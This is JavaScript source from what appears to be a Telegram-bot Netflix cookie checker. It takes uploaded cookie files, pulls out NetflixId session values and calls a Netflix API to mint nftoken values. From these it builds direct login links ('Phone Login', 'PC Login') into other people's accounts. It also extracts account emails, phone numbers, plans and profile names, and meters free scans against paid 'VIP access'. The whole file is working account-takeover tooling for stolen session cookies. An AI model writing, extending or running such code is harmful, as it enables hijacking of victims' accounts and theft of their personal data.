    `Remaining: ${formatReportRemaining((resultEntry.nftokenData || {}).expires_at_utc)}`,
    "",
    "Account Details:",
    ...details.map(([label, value]) => `  - ${label}: ${value}`),
  ];

  const links = buildReportNftokenLinks(resultEntry.nftokenData || {});
  if (links.length) {
    lines.push("");
    for (const [label, link] of links) {
      lines.push(`${label}: ${link}`);
    }
  }

  lines.push("");
  return lines.join("\n");
}

async function createNftoken(cookies, env) {
  const netflixId = decodeNetflixValue(cookies.NetflixId);
  if (!netflixId) return null;

  const attempts = Math.max(1, Number(env.NFTOKEN_ATTEMPTS || 1));
  const url = new URL(NFTOKEN_API_URL);
  for (const [key, value] of Object.entries(NFTOKEN_QUERY_PARAMS)) {
    url.searchParams.set(key, value);
  }

  for (let attempt = 0; attempt < attempts; attempt += 1) {
    const response = await fetchWithTimeout(url.toString(), {
      headers: {
        ...NFTOKEN_HEADERS,
        Cookie: `NetflixId=${netflixId}`,
      },
    }, Number(env.NFTOKEN_REQUEST_TIMEOUT_MS || 12000));

    if (!response.ok) continue;

    const data = await response.json().catch(() => null);
    const tokenData = (((data || {}).value || {}).account || {}).token?.default || {};
    const token = decodeNetflixValue(tokenData.token);
    if (token) {
      return {
        token,
        expires_at_utc: getNftokenExpiryUtc(tokenData.expires),
      };
    }
  }

  return null;
}

function buildReportNftokenLinks(nftokenData) {
  const token = decodeNetflixValue(nftokenData.token);
  if (!token) return [];
  return [
    ["Phone Login", `https://www.netflix.com/unsupported?nftoken=${token}`],
    ["PC Login", `https://www.netflix.com/account?nftoken=${token}`],
    ["Login Link", `https://www.netflix.com/login?nftoken=${token}`],
  ];
}

function getNftokenExpiryUtc(expires) {
  let normalized = decodeNetflixValue(expires);
  if (normalized && /^\d+$/.test(normalized)) {
    let timestamp = Number(normalized);
    if (String(Math.abs(timestamp)).length === 13) timestamp = Math.floor(timestamp / 1000);
    return formatUtcDate(new Date(timestamp * 1000));
  }
  return formatUtcDate(new Date(Date.now() + 60 * 60 * 1000));
}

function formatReportExpiry(expiresAtUtc) {
  const parsed = parseReportExpiry(expiresAtUtc);
  if (!parsed) return "UNKNOWN";
  return formatTimestamp(parsed);
}

function formatReportRemaining(expiresAtUtc) {
  const parsed = parseReportExpiry(expiresAtUtc);
  if (!parsed) return "UNKNOWN";
  const seconds = Math.max(0, Math.floor((parsed.getTime() - Date.now()) / 1000));
  const hours = Math.floor(seconds / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const remainingSeconds = seconds % 60;
  return `${hours}h ${minutes}m ${remainingSeconds}s`;
}

function parseReportExpiry(expiresAtUtc) {
  const cleaned = decodeNetflixValue(expiresAtUtc);
  if (!cleaned) return null;
  const normalized = cleaned.replace(" UTC", "Z").replace(" ", "T");
  const parsed = new Date(normalized);
  return Number.isNaN(parsed.getTime()) ? null : parsed;
}

function formatReportCookieValue(netscapeContent) {
  const cookies = cookiesDictFromNetscape(netscapeContent);
  if (decodeNetflixValue(cookies.NetflixId)) return `NetflixId=${decodeNetflixValue(cookies.NetflixId)}`;
  const parts = [];
  for (const name of ["SecureNetflixId", "nfvdid", "OptanonConsent"]) {
    const value = decodeNetflixValue(cookies[name]);
    if (value) parts.push(`${name}=${value}`);
  }
  return parts.length ? parts.join("; ") : "UNKNOWN";
}

function deriveOutputPlanBucket(info, isSubscribed) {
  const plan = derivePlanInfo(info, isSubscribed);
  if (isSubscribed && isExtraMemberAccount(info)) {
    return { planKey: "extra_member_premium", folderLabel: "Premium (Extra Member)", displayLabel: "Premium (Extra Member)" };
  }
  return { planKey: plan.planKey, folderLabel: getCanonicalOutputLabel(plan.planKey), displayLabel: plan.planName };
}

function derivePlanInfo(info, isSubscribed) {
  const rawPlan = decodeNetflixValue(info.localizedPlanName);
  const rawQuality = decodeNetflixValue(info.videoQuality);
  const streams = intOrNull(info.maxStreams);
  if (!isSubscribed && !rawPlan) return { planKey: "free", planName: "Free" };
  const normalized = rawPlan ? normalizePlanKey(rawPlan) : "";
  const aliasMap = {
    premium: ["premium", "premium_extra_member", "extra_member_premium", "premium_plan"],
    standard_with_ads: ["standard_with_ads", "standardwithads", "estandar_con_anuncios", "standard_with_adverts"],
    standard: ["standard", "estandar", "padrao", "standart", "standar", "standardowy", "standaard"],
    basic: ["basic", "basic_with_ads", "basico", "basis", "base", "essentiel"],
    mobile: ["mobile", "movil", "ponsel", "seluler"],
  };
  for (const [key, aliases] of Object.entries(aliasMap)) {
    if (aliases.includes(normalized)) return { planKey: key, planName: getCanonicalOutputLabel(key) };
  }
  if (streams !== null) {
    const quality = rawQuality ? normalizePlanKey(rawQuality) : "";
    if (streams >= 4 || ["uhd", "ultra_hd", "4k"].includes(quality)) return { planKey: "premium", planName: "Premium" };
    if (streams >= 2 || ["hd", "full_hd"].includes(quality)) return { planKey: "standard", planName: "Standard" };
    if (streams === 1) return normalized === "mobile" ? { planKey: "mobile", planName: "Mobile" } : { planKey: "basic", planName: "Basic" };
  }
  if (rawPlan) return { planKey: normalizePlanKey(rawPlan), planName: rawPlan };
  if (!isSubscribed) return { planKey: "free", planName: "Free" };
  return { planKey: "unknown", planName: "Unknown" };
}

function isSubscribedAccount(info) {
  const status = normalizePlanKey(info.membershipStatus);
  return status === "current_member" || isExtraMemberAccount(info);
}

function isExtraMemberAccount(info) {
  const explicit = decodeNetflixValue(info.isExtraMemberAccount);
  if (explicit) return ["yes", "true", "1"].includes(explicit.toLowerCase());
  const candidates = [info.localizedPlanName, info.membershipStatus].map((value) => decodeNetflixValue(value) || "");
  return candidates.some((value) => /extra member|miembro extra|suscriptor extra|membro extra|assinante extra/i.test(value));
}

function isOnHoldAccount(info) {
  const hold = formatBooleanLabel(info.holdStatus);
  if (hold) return hold === "Yes";
  return /(hold|past_due|payment_retry|paused|suspend)/.test(normalizePlanKey(info.membershipStatus));
}

function getCanonicalOutputLabel(planKey) {
  return {
    premium: "Premium",
    standard_with_ads: "Standard With Ads",
    standard: "Standard",
    basic: "Basic",
    mobile: "Mobile",
    extra_member_premium: "Premium (Extra Member)",
    free: "Free",
    duplicate: "Duplicate",
    unknown: "Unknown",
  }[planKey] || "Unknown";
}

function hasCompleteAccountInfo(info) {
  return ["countryOfSignup", "membershipStatus", "localizedPlanName"].every((key) => info[key] && info[key] !== "null");
}

function mergeInfo(primary, fallback) {
  return { ...(fallback || {}), ...compactObject(primary || {}) };
}

function compactObject(value) {
  return Object.fromEntries(Object.entries(value).filter(([, item]) => item !== null && item !== undefined && item !== ""));
}

function getGrowthEmail(profile) {
  const growthEmail = (profile || {}).growthEmail || {};
  const emailObj = growthEmail.email || {};
  return {
    email: typeof emailObj === "object" ? emailObj.value : null,
    verified: growthEmail.isVerified,
  };
}

function extractPriceValue(plan) {
  if (!plan || typeof plan !== "object") return null;
  for (const key of ["priceDisplay", "displayPrice", "formattedPrice", "formattedPlanPrice", "planPriceDisplay"]) {
    const value = decodeNetflixValue(plan[key]);
    if (value) return value;
  }
  const price = plan.price || {};
  for (const key of ["displayValue", "formatted", "formattedPrice", "displayPrice", "value", "amountDisplay"]) {
    const value = decodeNetflixValue(price[key]);
    if (value) return value;
  }
  return null;
}

function firstBooleanLabel(...candidates) {
  for (const candidate of candidates) {
    const label = formatBooleanLabel(candidate);
    if (label) return label;
  }
  return null;
}

function extractFirstMatch(text, patterns) {
  for (const pattern of patterns) {
    const match = pattern.exec(text);
    if (match) return decodeNetflixValue(match[1]);
  }
  return null;
}

function extractBoolValue(text, patterns) {
  const value = extractFirstMatch(text, patterns);
  return formatBooleanLabel(value) || value;
}

function extractProfileNames(text) {
  const names = new Set();
  for (const pattern of [/"profileName"\s*:\s*"([^"]+)"/g, /"__typename"\s*:\s*"Profile"[\s\S]{0,1200}?"name"\s*:\s*"([^"]+)"/g]) {
    for (const match of text.matchAll(pattern)) {
      const name = decodeNetflixValue(match[1]);
      if (name) names.add(name);
    }
  }
  return names.size ? [...names].join(", ") : null;
}

function parseBooleanValue(value) {
  if (typeof value === "boolean") return value;
  if (typeof value === "number") return value === 1 ? true : value === 0 ? false : null;
  if (value && typeof value === "object") {
    for (const key of ["value", "isUserOnHold", "holdStatus", "isOnHold", "pastDue", "isPastDue", "isVerified", "verified"]) {
      if (key in value) {
        const parsed = parseBooleanValue(value[key]);
        if (parsed !== null) return parsed;
      }
    }
    return null;
  }
  const cleaned = decodeNetflixValue(value);
  if (!cleaned) return null;
  const lowered = cleaned.toLowerCase();
  if (["true", "yes", "1", "on"].includes(lowered)) return true;
  if (["false", "no", "0", "off"].includes(lowered)) return false;
  return null;
}

function formatBooleanLabel(value) {
  const parsed = parseBooleanValue(value);
  if (parsed === true) return "Yes";
  if (parsed === false) return "No";
  return null;
}

function normalizeOutputValue(value, unknownFallback = "UNKNOWN", naWhenFalse = false) {
  const cleaned = decodeNetflixValue(value);
  if (!cleaned) return unknownFallback;
  const lowered = cleaned.toLowerCase();
  if (["false", "none", "null"].includes(lowered)) return naWhenFalse ? "N/A" : unknownFallback;
  return cleaned;
}

function normalizePhoneNumber(value, countryCode) {
  const cleaned = decodeNetflixValue(value);
  if (!cleaned) return null;
  if (cleaned.startsWith("+")) return cleaned;
  const digits = cleaned.replace(/\D+/g, "");
  if (!digits) return cleaned;
  if (String(countryCode || "").toUpperCase() === "IN" && digits.startsWith("0") && digits.length >= 10) {
    return `+91${digits.replace(/^0+/, "")}`;
  }
  return cleaned;
}

function normalizePlanKey(value) {
  if (!value) return "unknown";
  return String(value)
    .normalize("NFKD")
    .replace(/[\u0300-\u036f]/g, "")
    .toLowerCase()
    .replace(/[^\p{L}\p{N}]+/gu, "_")
    .replace(/^_+|_+$/g, "") || "unknown";
}

function intOrNull(value) {
  const cleaned = decodeNetflixValue(value);
  if (!cleaned) return null;
  const match = String(cleaned).match(/\d+/);
  return match ? Number(match[0]) : null;
}

function formatPlanLabel(planKey) {
  return String(planKey || "unknown").replace(/_/g, " ").replace(/\b\w/g, (char) => char.toUpperCase());
}

function describeHttpError(statusCode) {
  return {
    403: "HTTP 403 Forbidden",
    429: "HTTP 429 Rate Limited",
    500: "HTTP 500 Server Error",
    502: "HTTP 502 Bad Gateway",
    503: "HTTP 503 Service Unavailable",
    504: "HTTP 504 Gateway Timeout",
  }[statusCode] || `HTTP ${statusCode}`;
}

function decodeNetflixValue(value) {
  if (value === null || value === undefined) return null;
  let cleaned = htmlUnescape(String(value))
    .replaceAll("\\x20", " ")
    .replaceAll("\\u00A0", " ")
    .replaceAll("\\u00a0", " ")
    .replaceAll("&nbsp;", " ")
    .replaceAll("u00A0", " ")
    .replaceAll("\\/", "/")
    .replaceAll('\\"', '"')
    .replaceAll("\\n", " ")
    .replaceAll("\\t", " ");
  for (let index = 0; index < 3; index++) {
    const previous = cleaned;
    cleaned = cleaned.replace(/\\u([0-9a-fA-F]{4})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)));
    cleaned = cleaned.replace(/\\x([0-9a-fA-F]{2})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)));
    cleaned = cleaned.replace(/(?<!\\)\bu([0-9a-fA-F]{4})(?![0-9a-fA-F])/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)));
    cleaned = cleaned.replaceAll("\\\\", "\\");
    if (cleaned === previous) break;
  }
  cleaned = cleaned.replace(/\s+/g, " ").trim();
  return cleaned || null;
}

function htmlUnescape(value) {
  return String(value)
    .replaceAll("&amp;", "&")
    .replaceAll("&lt;", "<")
    .replaceAll("&gt;", ">")
    .replaceAll("&quot;", '"')
    .replaceAll("&#39;", "'");
}

function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;");
}

function formatTimestamp(date) {
  const pad = (value) => String(value).padStart(2, "0");
  return `${date.getUTCFullYear()}-${pad(date.getUTCMonth() + 1)}-${pad(date.getUTCDate())} ${pad(date.getUTCHours())}:${pad(date.getUTCMinutes())}:${pad(date.getUTCSeconds())}`;
}

function formatUtcDate(date) {
  return `${formatTimestamp(date)} UTC`;
}

function getFreeScanLimits(env = {}) {
  return {
    maxCookies: readPositiveInteger(env.FREE_MAX_COOKIES_PER_SCAN, DEFAULT_FREE_MAX_COOKIES_PER_SCAN),
    dailyLimit: readPositiveInteger(env.FREE_DAILY_SCAN_LIMIT, DEFAULT_FREE_DAILY_SCAN_LIMIT),
    cooldownMs: readPositiveInteger(env.FREE_SCAN_COOLDOWN_MS, DEFAULT_FREE_SCAN_COOLDOWN_MS),
    timeZone: String(env.FREE_LIMIT_TIME_ZONE || DEFAULT_FREE_LIMIT_TIME_ZONE),
  };
}

function getResultCaption(env = {}) {
  return String(env.RESULT_CAPTION || DEFAULT_RESULT_CAPTION);
}

function getScannerHandle(env = {}) {
  const configured = String(env.SCANNER_HANDLE || "").trim();
  if (configured) return configured.startsWith("@") ? configured : `@${configured}`;
  const captionMatch = getResultCaption(env).match(/@[A-Za-z0-9_]+/);
  return captionMatch ? captionMatch[0] : DEFAULT_SCANNER_HANDLE;
}

function readPositiveInteger(value, fallback) {
  const parsed = Number.parseInt(String(value ?? ""), 10);
  return Number.isFinite(parsed) && parsed > 0 ? parsed : fallback;
}

function buildFreeTierNotice(limits = getFreeScanLimits(), usage = null) {
  const scanLabel = limits.dailyLimit === 1 ? "scan" : "scans";
  const lines = [
    `Free users can scan up to ${limits.maxCookies} cookies at a time, ${limits.dailyLimit} ${scanLabel} per day, with a ${formatDurationLabel(limits.cooldownMs)} cooldown.`,
  ];
  if (usage) {
    lines.push(`Free scans left today: ${usage.remainingToday}/${limits.dailyLimit}.`);
    if (usage.cooldownRemainingMs > 0) {
      lines.push(`Next free scan in ${formatDurationLabel(usage.cooldownRemainingMs)}.`);
    }
  }
  return lines.join("\n");
}

function buildFreeTierBlockedMessage(limits, usage, ownerUsername = DEFAULT_OWNER_USERNAME) {
  const lines = [buildFreeTierNotice(limits, usage)];
  if (usage.remainingToday <= 0) {
    lines.push("Daily free scan limit reached. Try again tomorrow or get VIP access.");
  } else if (usage.cooldownRemainingMs > 0) {
    lines.push(`Cooldown active. Try again in ${formatDurationLabel(usage.cooldownRemainingMs)} or get VIP access.`);
  }
  lines.push(`VIP access: ask ${ownerUsername || DEFAULT_OWNER_USERNAME}.`);
  return lines.join("\n");
}

function formatDurationLabel(ms) {
  const totalMinutes = Math.max(1, Math.ceil(Number(ms || 0) / 60000));
  if (totalMinutes < 60) {
    return `${totalMinutes} ${totalMinutes === 1 ? "minute" : "minutes"}`;
  }
  const hours = Math.floor(totalMinutes / 60);
  const minutes = totalMinutes % 60;
  const hourText = `${hours} ${hours === 1 ? "hour" : "hours"}`;
  if (!minutes) return hourText;
  return `${hourText} ${minutes} ${minutes === 1 ? "minute" : "minutes"}`;
}

function getFreeLimitDayKey(timestamp, timeZone) {
  const date = new Date(timestamp);
  try {
    const parts = new Intl.DateTimeFormat("en-US", {
      timeZone,
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
    }).formatToParts(date);
    const value = Object.fromEntries(parts.map((part) => [part.type, part.value]));
    return `${value.year}-${value.month}-${value.day}`;
  } catch {
    return date.toISOString().slice(0, 10);
  }
}

function formatReportSource(files) {
  if (!files.length) return "UNKNOWN";
  if (files.length === 1) return files[0];
  if (files.length <= 3) return files.join(", ");
  return `${files.length} files`;
}

function decodeBytes(bytes) {
  const view = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
  if (!view.length) return "";

  if (view.length >= 2) {
    if (view[0] === 0xff && view[1] === 0xfe) {
      return stripNulls(new TextDecoder("utf-16le", { fatal: false }).decode(view));
    }
    if (view[0] === 0xfe && view[1] === 0xff) {
      return stripNulls(new TextDecoder("utf-16be", { fatal: false }).decode(view));
    }
  }

  const evenNulls = countNulls(view, 0);
  const oddNulls = countNulls(view, 1);
  const samplePairs = Math.max(1, Math.floor(view.length / 2));
  if (oddNulls / samplePairs > 0.3) {
    return stripNulls(new TextDecoder("utf-16le", { fatal: false }).decode(view));
  }
  if (evenNulls / samplePairs > 0.3) {
    return stripNulls(new TextDecoder("utf-16be", { fatal: false }).decode(view));
  }

  const utf8 = new TextDecoder("utf-8", { fatal: false }).decode(view);
  const replacementCount = (utf8.match(/\uFFFD/g) || []).length;
  if (replacementCount > Math.max(3, utf8.length * 0.02)) {
    try {
      return stripNulls(new TextDecoder("windows-1252", { fatal: false }).decode(view));
    } catch {
      return stripNulls(utf8);
    }
  }
  return stripNulls(utf8);
}

function countNulls(bytes, startIndex) {
  let count = 0;
  for (let index = startIndex; index < bytes.length; index += 2) {
    if (bytes[index] === 0) count += 1;
  }
  return count;
}

function stripNulls(value) {
  return String(value || "").replace(/\u0000/g, "");
}

function sanitizeFilename(name) {
  const base = String(name || "cookie.txt").split(/[\\/]/).pop();
  return base.replace(/[<>:"/\\|?*\x00-\x1f]+/g, "_").replace(/^[ .]+|[ .]+$/g, "") || "cookie.txt";
}

function getExtension(name) {
  const match = String(name || "").toLowerCase().match(/\.[^.]+$/);
  return match ? match[0] : "";
}

function escapeRegExp(value) {
  return String(value).replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function normalizeId(value) {
  if (value === null || value === undefined) return "";
  const cleaned = String(value).trim();
  if (!cleaned) return "";
  const match = cleaned.match(/^-?\d+$/);
  return match ? match[0] : "";
}

function getConfiguredAdminIds(env) {
  const raw = String(env.ADMIN_CHAT_IDS || env.PRIMARY_ADMIN_ID || DEFAULT_ADMIN_CHAT_IDS.join(","));
  return [...new Set(raw.split(",").map((item) => normalizeId(item)).filter(Boolean))];
}

function parseApprovedUserArgs(args) {
  const values = Array.isArray(args) ? args : [];
  const targetId = normalizeId(values[0]);
  let username = "";
  const nameParts = [];

  for (const rawPart of values.slice(1)) {
    const part = String(rawPart || "").trim();
    if (!part) continue;
    if (!username && part.startsWith("@")) {
      username = normalizeTelegramUsername(part);
      continue;
    }
    nameParts.push(part);
  }

  return {
    targetId,
    name: sanitizeUserLabel(nameParts.join(" ")),
    username,
  };
}

function sanitizeUserLabel(value) {
  const cleaned = String(value || "").replace(/\s+/g, " ").trim();
  return cleaned ? cleaned.slice(0, 80) : "";
}

function normalizeTelegramUsername(value) {
  const cleaned = String(value || "").trim().replace(/^@+/, "");
  if (!cleaned) return "";
  const match = cleaned.match(/^[A-Za-z0-9_]{3,32}$/);
  return match ? `@${match[0]}` : "";
}

function looksLikeCookieText(text) {
  const value = String(text || "").trim();
  if (!value) return false;
  if (extractNetflixCookieBundles(value).length > 0) return true;
  return /netflixid|securenetflixid|nfvdid|\.netflix\.com|www\.netflix\.com/i.test(value);
}
